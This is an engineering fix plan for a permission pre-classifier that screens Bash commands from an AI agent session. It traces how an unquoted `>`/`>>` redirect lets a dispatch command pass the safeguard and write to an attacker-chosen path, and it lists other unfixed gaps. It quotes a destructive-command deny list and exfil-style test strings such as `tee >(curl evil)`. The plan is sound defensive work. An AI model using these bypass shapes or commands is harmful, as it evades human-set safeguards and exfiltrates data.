---
ticket: mika#943
type: fix
component: server/permission_pre_classifier
date: 2026-05-20
seq: 003
base_sha: 3a39bd31e01fa9ee881d20899ca4e4bd39e988d6
related:
  - mika#935  # Original structural pre-classifier
  - mika#938  # Quote-aware metacharacter rejection (Branch 5) — quote-state scanner introduced
  - mika#942  # Process-substitution gap — sibling under milestone#23, shipped
  - mika#944  # ANSI-C quoting gap — sibling under milestone#23
  - mika#946  # Python parity contract — shipped, prerequisite for #942/#943/#944
  - claude-pilot-py/src/claude_pilot/tier1.py:91  # Python sibling regex for `>` / `>>`
milestone: 23  # Permission pre-classifier hardening
---

# Pre-classifier output-redirect gap (`>` / `>>`) — fix plan

## Sequencing — milestone#23 prerequisite satisfied

This ticket sits under **milestone#23** ("Permission pre-classifier hardening"). The milestone description specifies:

> Sequencing: #946 (parity contract) first, then #942/#943/#944 in parallel.

State at grooming time (`main` HEAD `3a39bd31`):
- **#946** (Python parity contract) — **CLOSED/shipped**. Prerequisite met.
- **#942** (process substitution) — **MERGED** (commit `7a233603`). Sibling work landed.
- **#943** (this ticket — output redirect) — open, ready to dispatch.
- **#944** (ANSI-C quoting) — open, parallel sibling.

No further sequencing gate. The `ready` label is the only remaining operator step.

## Problem (verbatim from issue body, with verified trace)

`TIER3_PATTERNS` at `crates/mika-agent/src/server/permission_pre_classifier.rs:80-90` does **not** list `>` or `>>`. `contains_unquoted_metacharacter()` (lines 177-231) scans for `$(`, `` ` ``, `>(`, `<(` outside quoted regions but does **not** scan for `>` or `>>` as file-redirect operators. The Python sibling `claude-pilot-py/src/claude_pilot/tier1.py:91` catches them via `re.compile(r'(?:^|[^<])>{1,2}(?!\()')`.

### Concrete bypass (verified against base SHA `3a39bd31`)

Command: `mika ask --agent mika-arch msg > /tmp/exfil`

Trace through the current Rust pre-classifier:

1. `pre_classify_pilot_event()` receives the PilotEvent and reaches Branch 5 (`crates/mika-agent/src/server/permission_pre_classifier.rs:130-132`).
2. `contains_unquoted_metacharacter(command)` walks bytes. At the `>` byte (position ~33 in the example), the only matching branch in the unquoted-state arm (`permission_pre_classifier.rs:218-220`) requires `bytes[i + 1] == b'('` — the `(` is absent, so the scanner advances past `>` without returning `true`. Returns `false`. **Gap fires here.**
3. `contains_tier3_pattern(command)` iterates over the 9 entries at `permission_pre_classifier.rs:80-90`; none match the substring `>`. Returns `false`.
4. `classify_intra_platform_dispatch(command)` splits on `&&` / `||` / `;` (`>` is not a compound separator) — one sub-command.
5. `try_parse_mika_ask_dispatch()` tokenizes via `shell_tokenize()` (`permission_pre_classifier.rs:468-507`). The tokenizer splits on whitespace, so `> /tmp/exfil` becomes two distinct tokens `>` and `/tmp/exfil`.
6. `try_match_mika_ask_in_tokens()` (`permission_pre_classifier.rs:330-350`) finds `mika` at index 0, `ask` at index 1, `--agent` at index 2, `mika-arch` at index 3. `extract_peer_from_tokens()` returns `Some("mika-arch")`. Peer is in `INTRA_PLATFORM_DISPATCH_PEERS`. Returns `Some("mika-arch")`.
7. `pre_classify_pilot_event()` returns `Some(Allow)`.
8. Bash receives the original command string and redirects `mika ask` output to `/tmp/exfil` — attacker-controlled path.

`>>` (append) has the same trace; `bytes[i + 1] == b'>'` is not checked anywhere either.

### Phase 0 — Pin (verbatim slices at base SHA `3a39bd31`)

Pinned against `3a39bd31e01fa9ee881d20899ca4e4bd39e988d6` (`main` HEAD at grooming time). Required by mika-arch first-pass review (F1 BLOCKING) — sibling mika#942 (commit `7a233603`) modified the same module, so Change 1.1's insertion point at lines 218-220 must be confirmed.

#### Pin 1 — `contains_unquoted_metacharacter` unquoted-branch — existing `>(` arm (Change 1.1 insertion point)

`crates/mika-agent/src/server/permission_pre_classifier.rs:215-224`:

```rust
                // Check for `$(`
                if bytes[i] == b'$' && i + 1 < len && bytes[i + 1] == b'(' {
                    return true;
                }
                // Check for `>(` (process substitution — output)
                if bytes[i] == b'>' && i + 1 < len && bytes[i + 1] == b'(' {
                    return true;
                }
                // Check for `<(` (process substitution — input)
                if bytes[i] == b'<' && i + 1 < len && bytes[i + 1] == b'(' {
                    return true;
                }
```

Confirms: the `>(` arm exists at lines 218-220 (introduced by mika#942 commit `7a233603`). Change 1.1 replaces lines 217-220 with a consolidated `>` arm; the `<(` arm at 221-224 is untouched.

#### Pin 2 — `TIER3_PATTERNS` const (confirms no `>` entry)

`crates/mika-agent/src/server/permission_pre_classifier.rs:80-90`:

```rust
const TIER3_PATTERNS: &[&str] = &[
    "rm -rf",
    "rm -fr",
    "git push --force",
    "git push -f",
    "git reset --hard",
    "DROP TABLE",
    "cargo publish",
    "gh label delete",
    "gh label edit",
];
```

Confirms: 9 entries, none contain `>`. Plan does NOT modify this const; carve-out is implemented in the scanner instead.

#### Pin 3 — module-level sentinel docstring (target of Change 1.2)

`crates/mika-agent/src/server/permission_pre_classifier.rs:60-79`:

```rust
/// TIER 3 dangerous patterns that always deny regardless of dispatch shape.
///
/// # Sentinel — cross-language duplication (mika#935, architect F5)
///
/// These patterns are mirrored from `claude-pilot-py/src/claude_pilot/tier1.py`.
/// `tier1.py` is the canonical source; this Rust module mirrors for defense-in-depth.
/// If the pattern set grows beyond 10 entries OR Python and Rust drift, escalate
/// to build-time codegen.
///
/// ## Branch 5 divergence (mika#938, mika#942, mika#946)
///
/// Branch 5 rejection uses quote-aware scanning in this Rust module via
/// `contains_unquoted_metacharacter()` for four metacharacters (`$(`,
/// backtick, `>(`, `<(`), while `tier1.py` uses quote-aware scanning for
/// `$(` and backtick (mika#946) but retains blanket regex rejection for
/// `>(` and `<(` (`tier1.py:89-90`). This is N=1 divergence (quote-awareness
/// asymmetry on the process-substitution pair only). Codegen escalation
/// threshold NOT crossed.
```

Change 1.2 updates the `## Branch 5 divergence` section to: bump issue list to include `mika#943`, bump metacharacter count from "four" to "six", document the fd-manipulation carve-out, and reflect that Python's regex at `tier1.py:91` adopts the same carve-out semantics.

#### Pin 4 — current Python output-redirect regex (target of Change 3.1)

`claude-pilot-py/src/claude_pilot/tier1.py:87-92`:

```python
    re.compile(r"\$\("),                                    # $(...)
    re.compile(r"`[^`]*`"),                                 # backticks
    re.compile(r"<\("),                                     # <(...)
    re.compile(r">\("),                                     # >(...)
    re.compile(r"(?:^|[^<])>{1,2}(?!\()"),                  # > or >> (not process sub)
)
```

Confirms: the output-redirect regex at line 91 currently uses `(?:^|[^<])>{1,2}(?!\()` — blanket rejection of `>` / `>>` not preceded by `<` and not followed by `(`. This rejects `2>&1` (the `2` matches `[^<]`). Change 3.1 replaces this single line with `(?<!<)>{1,2}(?!\(|&[\d-])` to add the fd-manipulation carve-out, matching the Rust semantics. The `<\(` and `>\(` patterns at lines 89-90 are untouched (they remain blanket regex in Python — the existing quote-awareness divergence).

#### Pin 5 — `test_pipe_to_tail` body (positive-test contract anchor)

`crates/mika-agent/src/server/permission_pre_classifier.rs:656-663`:

```rust
    #[test]
    fn test_pipe_to_tail() {
        let msg = pilot_event_bash_raw(r#""mika ask --agent mika-arch \"Hello\" 2>&1 | tail -20""#);
        assert_eq!(
            pre_classify_pilot_event(&msg, "mika-relay"),
            Some(PermissionAction::Allow)
        );
    }
```

Confirms: existing positive test for `2>&1 | tail -20` workflow. This test MUST stay green after Change 1.1 — the fd-manipulation carve-out for `2>&1` is the load-bearing predicate.

### Why this matters in production

The pre-classifier is the structural pre-filter for **claude-pilot-originated** PilotEvents on the mika-relay agent. A compromised claude-pilot session, or an injected prompt that drives the SDK to emit a malformed Bash request, could reach this surface. `>` redirect is one of the simplest exfil shapes (no `$(`, no `;` compounding) and the existing scanner happens to miss it.

## Decision (D1) — Detection approach

**Chosen: extend `contains_unquoted_metacharacter()` with quote-aware `>` / `>>` detection and an `>&<digit-or-dash>` carve-out for fd-manipulation forms.**

### Decision space

Three implementation options were considered. Comparison:

| Option | Where | Quote-aware? | Distinguishes `2>&1` from `2>file`? | Maintenance cost |
|---|---|---|---|---|
| A — Substring in `TIER3_PATTERNS` | `TIER3_PATTERNS` const | No | No (substring `>` matches `2>&1`) | Low — one line |
| B — Dedicated regex outside scanner | Add `OUTPUT_REDIRECT_RE` | No | Possible (Python-style regex) | Medium — new path |
| C — Extend `contains_unquoted_metacharacter` | Existing quote-state scanner | **Yes** | **Yes** (byte-by-byte) | Low — additive arm |

**Option C selected** because:

1. **Architectural consistency.** The Rust module already uses a quote-state byte scanner for the four metacharacters added by #938/#942 (`$(`, backtick, `>(`, `<(`). Adding `>` / `>>` to a *different* mechanism would create N=2 detection paths in one file — the kind of asymmetry that breeds future drift.
2. **Preserves existing positive workflow.** Test `test_pipe_to_tail` at `permission_pre_classifier.rs:657-663` asserts `mika ask --agent mika-arch "Hello" 2>&1 | tail -20` returns `Allow`. This is a real workflow (operator wants stderr merged with stdout while piping to a safe target). Option A or B with a naive substring would force this test to be deleted. Option C with the fd-manipulation carve-out keeps it green.
3. **Quoted-message safety.** Briefs sent through `/mika-ask-arch` and `/mika-ask-a-friend` regularly contain literal `>` characters inside double-quoted message bodies (e.g., markdown blockquotes, code snippets like `git log --oneline | head > /tmp/foo`). Option A/B would reject these as false positives. Option C respects the quote state already tracked by the scanner.

### Carve-out rule (formal)

A `>` byte encountered in **unquoted state** is rejected **unless** it is part of an fd-manipulation form. The carve-out admits exactly these byte sequences:

- `>&<digit>` — duplicate fd to a numbered fd (e.g., `>&2`, `>&1`)
- `>&-` — close fd
- `>>&<digit>` — append, with fd duplication (rare but valid bash)
- `>>&-` — append form of fd close (uncommon, kept for symmetry)

Anything else triggers rejection. Concretely:

| Input substring | Disposition | Why |
|---|---|---|
| `>(` | reject | process substitution — already caught at `permission_pre_classifier.rs:218-220` (unchanged) |
| `>&2`, `>&1`, `2>&1`, `1>&2` | **allow** | fd-manipulation: `>` immediately followed by `&` + digit |
| `>&-`, `2>&-` | **allow** | fd-close form |
| `>foo`, `> /tmp/x` | **reject** | file-write redirect |
| `>>foo`, `>> /tmp/x` | **reject** | append file-write redirect |
| `2>foo`, `2> /tmp/x` | **reject** | numeric-fd to file (accepted-deny per AC) |
| `2>/dev/null` | **reject** | numeric-fd to file (accepted-deny per AC; covered explicitly in the issue body) |
| `&>foo` | **reject** | `&>` is bash "stdout+stderr to file" — same exfil shape as `>` |
| `>` inside `"..."` or `'...'` | allow (no scan) | literal in message content |

The carve-out **does not** look at what precedes the `>` (so `2>&1` is allowed via the `>&1` suffix, not via the `2` prefix). This is intentional: prefix-based detection is harder to reason about (e.g., `2>foo` would be ambiguous as "fd-redirect" vs "file-write"), whereas suffix-based detection cleanly answers "does this `>` write to a file?"

**Citation — how `&>foo` reaches the rejection arm (mika-arch F2 NON-BLOCKING):** The scanner has no `b'&'` arm in the unquoted-state match (see Pin 1 above — only `b'\''`, `b'"'`, `b'`'`, `b'$'`, `b'>'`, `b'<'` arms exist). When the scanner encounters `&>foo`:

1. Position 0 byte `&` matches none of the unquoted-state arms; the bottom-of-match `i += 1` at `permission_pre_classifier.rs:225` advances past it.
2. Position 1 byte `>` enters the new consolidated `>` arm (Change 1.1).
3. `bytes[i + 1] = b'f'`, not `b'('` — process-sub check skipped.
4. `after_arrows = i + 1 = 2` (no `>>` doubling). `bytes[2] = b'f'`, not `b'&'` — `is_fd_manipulation = false`.
5. Returns `true` — rejected.

So `&>foo` IS rejected by Change 1.1, *not* by a dedicated `&` arm. The rejection comes from the `>` arm seeing `>foo` (not `>&<digit>` / `>&-`). Same trace applies to `&>>foo` (where `bytes[i+1] = b'>'` triggers `>>` doubling, `after_arrows = i + 2 = 3`, `bytes[3] = b'f'`, not `b'&'`, still rejected). The decision table entry `&>foo → reject` is therefore implementation-backed; no separate `b'&'` arm is needed.

### Trade-off: `2>/dev/null` becomes deny

Operators using `2>/dev/null` to silence stderr while keeping mika output will get a relay-decision instead of a fast-path allow. The AC explicitly accepts this ("accepted-deny if pattern can't distinguish"). Cost is a single LLM round-trip per such invocation. Operator workaround: pipe to a safe pipe target instead (`| cat >/dev/null` is also blocked; the practical workaround is to drop the redirect altogether for fast-path or rely on relay approval).

## Decision (D2) — Companion Python change (parity)

**Tighten `claude-pilot-py/src/claude_pilot/tier1.py:91` to match the Rust carve-out semantics.**

Current Python regex (blanket):
```python
re.compile(r"(?:^|[^<])>{1,2}(?!\()")
```
- Rejects `2>&1` (no fd-manipulation carve-out).
- Accepts `<>` (read-write open) by accident — `<` precedes — known minor gap, unchanged.

Proposed Python regex (with carve-out):
```python
re.compile(r"(?<!<)>{1,2}(?!\(|&[\d-])")
```
- `(?<!<)` — negative lookbehind: not preceded by `<` (preserves the existing `<>` accidental allow, which is not in scope here).
- `>{1,2}` — one or two `>`.
- `(?!\()` — not followed by `(` (process-sub `>(` is caught by the dedicated regex at `tier1.py:90`).
- `(?!&[\d-])` — **new**: not followed by `&` then a digit or `-` (fd-manipulation carve-out).

**Test verification (mental trace):**

| Command | Match? | Expected |
|---|---|---|
| `mika ask "msg" > /tmp/exfil` | `>` at pos N: lookbehind ` `, lookahead ` ` → match | reject ✓ |
| `mika ask "msg" >> /tmp/exfil` | `>>` at pos N: lookbehind ` `, lookahead ` ` → match | reject ✓ |
| `mika ask "msg" 2>&1 \| tail` | `>` at pos N: lookbehind `2`, lookahead `&1` → no match (carve-out) | allow ✓ |
| `mika ask "msg" >&2` | `>` at pos N: lookbehind ` `, lookahead `&2` → no match (carve-out) | allow ✓ |
| `2>/dev/null` | `>` at pos 1: lookbehind `2`, lookahead `/` → match | reject (accepted-deny) ✓ |
| `mika ask --agent mika-arch ">(literal)"` | `>(` matched by separate regex at line 90; this one is inside quotes — but Python's regex is not quote-aware. So this would match. | reject ✓ (same as current Python behavior; quoted-content false-positive is an existing Python limitation, out of scope) |

**Sentinel docstring update (Rust side).** The Rust module-level comment at `permission_pre_classifier.rs:60-79` currently describes Branch-5 divergence between Rust and Python. After this fix:

- Rust's `contains_unquoted_metacharacter()` adds `>` and `>>` to its repertoire (now six metacharacters: `$(`, backtick, `>(`, `<(`, `>`, `>>`).
- Python's `tier1.py:91` regex adopts the same carve-out semantics.
- Divergence axis: **Quote-awareness asymmetry persists** — Rust scans quote state, Python uses regex (no quote tracking). The two surfaces will reject differently for `>` literally inside quoted message text: Rust **allows** (quote-aware), Python **rejects** (blanket regex). This was the state for `>(` and `<(` already; #943 doesn't change the axis.

Updated comment shape (verbatim text to commit in §3 below):

```
/// ## Branch 5 divergence (mika#938, mika#942, mika#943, mika#946)
///
/// Branch 5 rejection uses quote-aware scanning in this Rust module via
/// `contains_unquoted_metacharacter()` for six metacharacters (`$(`,
/// backtick, `>(`, `<(`, `>`, `>>`), with an fd-manipulation carve-out for
/// `>&<digit>` / `>&-` forms (mika#943). `tier1.py` uses blanket regex
/// rejection for the same six shapes, with the same fd-manipulation
/// carve-out (`tier1.py:91`). The N=1 divergence axis is quote-awareness
/// (Rust is quote-aware, Python is not). Codegen escalation threshold
/// NOT crossed.
```

## Implementation

### Phase 1 — Rust scanner extension

**File:** `mika/crates/mika-agent/src/server/permission_pre_classifier.rs`

#### Change 1.1 — Extend `contains_unquoted_metacharacter()`

**Location:** Inside the `None =>` arm of `quote_state` match, after the existing `<(` check at `permission_pre_classifier.rs:221-224`. Insert a new branch that handles `>` (with `>(` already caught two lines above and remaining unchanged).

**Approach:** Replace the existing `>(` check (lines 218-220) with a consolidated `>` arm that handles all three cases: `>(` (process sub — reject), fd-manipulation forms (allow), and plain `>` / `>>` (reject).

Pseudo-diff (the actual edit will preserve the rest of the file):

```rust
                // Check for `>` — process substitution `>(` rejects, fd-manipulation
                // `>&<digit>` / `>&-` allows, plain `>` / `>>` rejects.
                // See mika#942 (process-sub) and mika#943 (output-redirect).
                if bytes[i] == b'>' {
                    // Process substitution — already covered by mika#942.
                    if i + 1 < len && bytes[i + 1] == b'(' {
                        return true;
                    }
                    // Walk past `>>` doubling so the carve-out check sees what
                    // follows the full redirect operator.
                    let after_arrows = if i + 1 < len && bytes[i + 1] == b'>' {
                        i + 2
                    } else {
                        i + 1
                    };
                    // fd-manipulation carve-out: `>&<digit>` (duplicate fd) or
                    // `>&-` (close fd). Both are bash-safe (no file write).
                    let is_fd_manipulation = after_arrows < len
                        && bytes[after_arrows] == b'&'
                        && after_arrows + 1 < len
                        && (bytes[after_arrows + 1].is_ascii_digit()
                            || bytes[after_arrows + 1] == b'-');
                    if is_fd_manipulation {
                        // Advance past the safe form and continue scanning.
                        i = after_arrows + 2;
                        continue;
                    }
                    // Plain `>` or `>>` redirect to file — reject.
                    return true;
                }
```

**Removed:** The standalone `>(` check at lines 218-220 (now folded into the consolidated arm above). The `<(` check at lines 221-224 stays untouched.

**Invariant preserved:** The function still returns `true` on the first metacharacter found in unquoted state. The scanner still treats `\"` inside double-quoted regions as an atomic escape per mika#938 F1. The single-quote POSIX semantics (no backslash escape) per mika#938 are unchanged.

#### Change 1.2 — Update the module-level sentinel docstring

**Location:** `permission_pre_classifier.rs:60-79`.

Replace the existing Branch 5 divergence paragraph with the updated wording shown in §D2 above (mention `mika#943` in the issue list; bump metachar count from "four" to "six"; document the fd-manipulation carve-out).

#### Change 1.3 — Update Branch 5 inline comment in `pre_classify_pilot_event()`

**Location:** `permission_pre_classifier.rs:126-129`.

Current comment:
```rust
    // Branch 5: Reject commands with shell-expansion metacharacters OUTSIDE quoted
    // regions. `$(`, backtick, `>(`, `<(` inside `"..."` or `'...'` are literal message
    // content (e.g., markdown briefs with inline code). Only unquoted occurrences would
    // trigger shell expansion on actual execution. See mika#938, mika#942.
```

Updated comment:
```rust
    // Branch 5: Reject commands with shell-expansion metacharacters OUTSIDE quoted
    // regions. `$(`, backtick, `>(`, `<(`, `>`, `>>` inside `"..."` or `'...'` are
    // literal message content (e.g., markdown briefs with inline code or shell
    // example syntax). Only unquoted occurrences would trigger shell expansion or
    // file redirection on actual execution. The `>` / `>>` arm exempts fd-manipulation
    // forms (`>&<digit>`, `>&-`) per the carve-out documented at the function. See
    // mika#938, mika#942, mika#943.
```

#### Change 1.4 — Function-level docstring update on `contains_unquoted_metacharacter()`

**Location:** `permission_pre_classifier.rs:158-176`.

Append a paragraph documenting the `>` / `>>` extension and the fd-manipulation carve-out. The existing `\"` / single-quote / unterminated-quote paragraphs stay verbatim.

New paragraph (appended to the docstring):

```
/// File-redirect handling (mika#943): unquoted `>` or `>>` is rejected as a file-write
/// redirect UNLESS immediately followed by `&` plus a digit (`>&1`, `>&2`, etc.) or
/// `&-` (close fd). Numeric-fd prefixes (e.g., the `2` in `2>&1`) are not part of the
/// allow predicate — the trailing `&<digit>` / `&-` form alone determines safety, so
/// `>&2` (shortcut for `1>&2`) is also allowed. `2>/dev/null` is rejected (accepted-deny
/// per the AC at mika#943).
```

### Phase 2 — Rust unit and integration tests

**File:** `mika/crates/mika-agent/src/server/permission_pre_classifier.rs` (inline `#[cfg(test)] mod tests`).

Tests follow the same naming style as the mika#938 and mika#942 test blocks. Add a new section header comment `// === mika#943: Output-redirect rejection tests ===` and place after the mika#942 test block (currently ending at line 1196).

#### 2.1 — Unit tests on `contains_unquoted_metacharacter`

**Negative (reject):**

- `test_unquoted_meta_output_redirect_to_file` — `"mika ask \"msg\" > /tmp/exfil"` → true
- `test_unquoted_meta_append_redirect_to_file` — `"mika ask \"msg\" >> /tmp/exfil"` → true
- `test_unquoted_meta_redirect_no_space` — `"mika ask \"msg\" >/tmp/exfil"` → true (no-space form; regression for the issue body's exact command minus the space)
- `test_unquoted_meta_redirect_to_dev_null` — `"mika ask \"msg\" > /dev/null"` → true (accepted-deny)
- `test_unquoted_meta_numeric_fd_to_file` — `"mika ask \"msg\" 2>/dev/null"` → true (accepted-deny; ensures numeric prefix does NOT confer safety)
- `test_unquoted_meta_redirect_amp_stdout_stderr` — `"mika ask \"msg\" &>/tmp/exfil"` → true (`&>` form is also a file-write — the `>` byte is rejected before the `&` prefix matters)
- `test_unquoted_meta_redirect_after_closing_quote` — `r#""mika ask \"msg\" > out""#` → true (existing pattern parity with the mika#938 closing-quote test)

**Positive (allow — fd-manipulation):**

- `test_unquoted_meta_fd_redirect_stderr_to_stdout` — `"mika ask \"msg\" 2>&1"` → false
- `test_unquoted_meta_fd_redirect_stdout_to_stderr` — `"mika ask \"msg\" 1>&2"` → false
- `test_unquoted_meta_fd_redirect_shortcut` — `"mika ask \"msg\" >&2"` → false (shortcut form, no numeric prefix)
- `test_unquoted_meta_fd_close` — `"mika ask \"msg\" >&-"` → false
- `test_unquoted_meta_fd_append_dup` — `"mika ask \"msg\" >>&1"` → false (rare bash form; included to lock the `>>` doubling pathway)

**Positive (allow — quoted content):**

- `test_unquoted_meta_redirect_inside_double_quotes` — `r#""mika ask --agent mika-arch \"see > for stdout redirect\"""#` → false
- `test_unquoted_meta_redirect_inside_single_quotes` — `"mika ask --agent mika-arch 'use > or >> for redirect'"` → false
- `test_unquoted_meta_redirect_inside_quotes_then_unquoted_after` — sanity for the unquoted-after-closing-quote path: a `>` inside quotes is allowed, but a `>` after the quote closes is rejected (composed test).

**Edge cases:**

- `test_unquoted_meta_empty_string_no_redirect` — `""` → false (preserves the empty-string base case)
- `test_unquoted_meta_just_redirect_char` — `">"` → true (degenerate case; `>` at position 0, no carve-out)
- `test_unquoted_meta_lone_arrow_then_eof` — `"foo >"` → true (no trailing content; reject conservatively — `after_arrows == len`, `is_fd_manipulation == false`)

#### 2.2 — Integration tests on `pre_classify_pilot_event`

**Issue-body exact command (regression):**

- `test_943_output_redirect_exact_issue_body` — `pilot_event_bash_raw(r#""mika ask --agent mika-arch msg > /tmp/exfil""#)` → `None`
- `test_943_append_redirect_to_attacker_path` — same shape with `>>`

**Per-peer coverage (parity with mika#942 test style):**

- `test_943_output_redirect_mika_arch` — `>` form with mika-arch peer → `None`
- `test_943_output_redirect_mika_dev` — same with mika-dev → `None`
- `test_943_output_redirect_mika_qa` — same with mika-qa → `None`

**Compound and pipe shapes (negative):**

- `test_943_output_redirect_in_compound` — `"cd /worktree && mika ask --agent mika-arch \"msg\" > /tmp/exfil"` → `None`
- `test_943_output_redirect_after_pipe_safe_target` — `"mika ask --agent mika-arch \"msg\" | tail -20 > /tmp/exfil"` → `None` (regression for the case where the post-pipe section also contains a redirect)

**Existing positive workflow (regression — MUST stay green):**

- The existing `test_pipe_to_tail` at line 657 (`r#""mika ask --agent mika-arch \"Hello\" 2>&1 | tail -20""#` → `Allow`) is **untouched** and must continue to pass. The carve-out covers it. This serves as the contract anchor for "fd-manipulation forms continue to fast-path."

**New positive form:**

- `test_943_fd_close_redirect_allowed` — `pilot_event_bash_raw(r#""mika ask --agent mika-arch \"msg\" >&-""#)` → `Allow`
- `test_943_fd_redirect_stdout_to_stderr_allowed` — `pilot_event_bash_raw(r#""mika ask --agent mika-arch \"msg\" 1>&2""#)` → `Allow`

**Quoted-content false-positive guard (regression for the `/mika-ask-arch` brief class):**

- `test_943_redirect_inside_brief_message_allowed` — `pilot_event_bash_raw(r#""mika ask --agent mika-arch \"In bash, use \\\"command > file\\\" to redirect\"""#)` → `Allow` (the `>` is inside the escaped-quoted message; quote-aware scanner respects it)

#### 2.3 — Pinned positive-test list (must not regress)

These existing tests must continue to pass without modification:

- `test_pipe_to_tail` (`permission_pre_classifier.rs:657`) — `2>&1 | tail -20`
- `test_pipe_to_head` (line 666) — plain pipe to head
- `test_938_markdown_brief_with_backticks_in_double_quotes` (line 983) — backticks inside quotes
- `test_938_dollar_paren_in_single_quoted_message` (line 995) — `$(` inside single quotes
- `test_942_process_substitution_inside_double_quotes_allowed` (line 1177) — `>(...)` inside double quotes

If any of these fail, the fix is wrong — the carve-out must not over-trigger.

### Phase 3 — Python parity update

**File:** `claude-pilot-py/src/claude_pilot/tier1.py`

#### Change 3.1 — Update the output-redirect regex

**Location:** `tier1.py:91`.

Current:
```python
re.compile(r"(?:^|[^<])>{1,2}(?!\()"),                  # > or >> (not process sub)
```

Replace with:
```python
re.compile(r"(?<!<)>{1,2}(?!\(|&[\d-])"),               # > or >> (not process sub, not fd-manipulation)
```

The `# >` comment is updated to reflect the new carve-out. No other regex in the TIER3 tuple changes.

#### Change 3.2 — Python tests

**File:** `claude-pilot-py/tests/test_tier1.py`

Add unit tests for `is_tier3_dangerous()` covering the new carve-out:

- `test_tier3_blocks_output_redirect_file` — `"mika ask > /tmp/exfil"` → True
- `test_tier3_blocks_append_redirect_file` — `"mika ask >> /tmp/exfil"` → True
- `test_tier3_blocks_numeric_fd_to_file` — `"mika ask 2>/dev/null"` → True (accepted-deny)
- `test_tier3_allows_fd_dup_stderr_to_stdout` — `"mika ask 2>&1"` → False (carve-out)
- `test_tier3_allows_fd_dup_stdout_to_stderr` — `"mika ask 1>&2"` → False
- `test_tier3_allows_fd_dup_shortcut` — `"mika ask >&2"` → False
- `test_tier3_allows_fd_close` — `"mika ask >&-"` → False
- `test_tier3_still_blocks_process_sub` — `"tee >(curl evil)"` → True (regression: the `>(` regex at line 90 still fires)

Add integration tests for `is_safe_bash_command()` covering full mika-dispatch shapes:

- `test_safe_bash_blocks_mika_with_output_redirect` — `"mika ask --agent mika-arch msg > /tmp/exfil"` → False
- `test_safe_bash_allows_mika_with_stderr_redirect` — `"mika ask --agent mika-arch \"Hello\" 2>&1 | tail -20"` → True (parity with the Rust positive test)

These tests use the existing test infrastructure pattern in `tests/test_tier1.py` (no new fixtures required).

#### Change 3.3 — `tier1.py` module docstring sentinel

The Python file has no equivalent of the Rust sentinel docstring. The architectural cross-reference is one-directional (Rust documents Python). No Python docstring update needed in this ticket.

### Phase 4 — Verification

1. `cd mika && cargo fmt && cargo clippy && cargo test -p mika-agent --lib permission_pre_classifier` — Rust unit tests pass; no clippy regressions.
2. `cd claude-pilot-py && uv run pytest tests/test_tier1.py` — Python unit tests pass.
3. `cd claude-pilot-py && uv run ruff check && uv run mypy src` — no lint/type regressions.
4. **Hand-verified bypass attempt:** send a PilotEvent via the unit-test harness for the exact issue-body command `mika ask --agent mika-arch msg > /tmp/exfil` and confirm `pre_classify_pilot_event()` returns `None` (rejection). Captured as `test_943_output_redirect_exact_issue_body` above.
5. **Cross-language parity smoke (manual at PR time):** run the same six representative commands (3 reject, 3 allow) through both `cargo test` and `uv run pytest`. Confirm same disposition modulo the documented quote-awareness axis. Result table goes in the PR description.

## Acceptance criteria mapping (from issue body)

| AC | Coverage |
|---|---|
| "`> /path`, `>> /path` rejected." | Phase 2 tests 2.1 + 2.2: `test_unquoted_meta_output_redirect_to_file`, `test_unquoted_meta_append_redirect_to_file`, `test_943_output_redirect_exact_issue_body`, `test_943_append_redirect_to_attacker_path`. |
| "`2>&1`, `2>/dev/null` still allowed (or accepted-deny if pattern can't distinguish)." | `2>&1` allowed via carve-out (`test_unquoted_meta_fd_redirect_stderr_to_stdout`, `test_pipe_to_tail` regression). `2>/dev/null` accepted-deny (`test_unquoted_meta_redirect_to_dev_null`, `test_unquoted_meta_numeric_fd_to_file`) — disposition explicitly justified above. |
| "New TIER3 patterns documented in the sentinel comment." | Change 1.2 updates the module-level sentinel docstring. Change 1.3/1.4 update the inline Branch-5 comment and the `contains_unquoted_metacharacter` function docstring. |
| "Companion fix in `tier1.py` for parity." | Phase 3 — `tier1.py:91` regex tightened with the same fd-manipulation carve-out. Python integration tests added. |

## Out of scope (filed as follow-ups if surfaced)

1. **`tee /path` exfil via pipe.** `is_safe_pipe_target()` lists `tee` as safe, but `tee /tmp/file` writes to `/tmp/file`. This is a distinct pipe-target-argument-inspection gap, orthogonal to the redirect-operator gap. Not addressed here; would need a separate fix that either drops `tee` from `SAFE_PIPE_TARGETS` or inspects its arguments. Should be raised as a new ticket if it isn't already covered by milestone#23's plan.
2. **`<>` read-write open.** Python's regex (current and proposed) skips `>` preceded by `<`. Rust's quote-aware scanner also doesn't reject `<>` in any current pattern. Rare in practice; deferred. Mention in the second-pass brief for architect awareness.
3. **`>` as a non-redirect operator in test/arithmetic contexts** (e.g., `test $a -gt $b` doesn't use `>`, but `(($a > $b))` does). The pre-classifier already rejects `$(` and arithmetic-substitution shapes are caught by the existing scanner. Bare `>` inside `((...))` would currently bypass, but `((` itself isn't in TIER3 — separate gap, separate ticket if surfaced.
4. **Sentinel comment drift.** The existing module-level sentinel claims Python is quote-aware for `$(` and backtick (per mika#946). Reading `tier1.py:87,88` shows Python is *still* blanket-regex for those. This is a pre-existing documentation drift, not introduced by #943. Plan acknowledges it but does NOT correct it (scope discipline). Worth filing a sentinel-cleanup ticket separately.

## Risk register

| Risk | Likelihood | Severity | Mitigation |
|---|---|---|---|
| Carve-out lets through an unexpected fd-manipulation form that does write to a file | Low | Medium | The carve-out is narrow: only `&<digit>` or `&-` immediately after `>` / `>>`. Bash semantics confirm these forms never write to a file. Tests cover the boundary. |
| `2>&1 | tail -20` regression (existing positive) | Very Low | High (operator workflow) | `test_pipe_to_tail` is the contract anchor. Plan explicitly pins it. |
| False positive on a brief containing `>` inside escaped quotes | Low | Low | Quote-aware scanner respects `\"` per mika#938 F1. New test `test_943_redirect_inside_brief_message_allowed` regression-guards this. |
| Python/Rust drift on the new carve-out | Low | Medium | Phase 4 step 5 (cross-language parity smoke) runs the same shapes through both. Six representative commands form the parity matrix. |
| Sentinel docstring goes stale again after #944 ships | Medium | Low | #944 (ANSI-C quoting) will update the same sentinel. Plan flags this as expected, not as a #943 obligation. |

## Citations (verbatim file:line references)

- `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:60-79` — module-level sentinel docstring (target of Change 1.2).
- `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:80-90` — `TIER3_PATTERNS` const (not modified — carve-out chosen instead).
- `mika/crates/mika-agent/src/server/permission_pre_classifier.rs:126-129` — Branch 5 inline comment (target of Change 1.3).
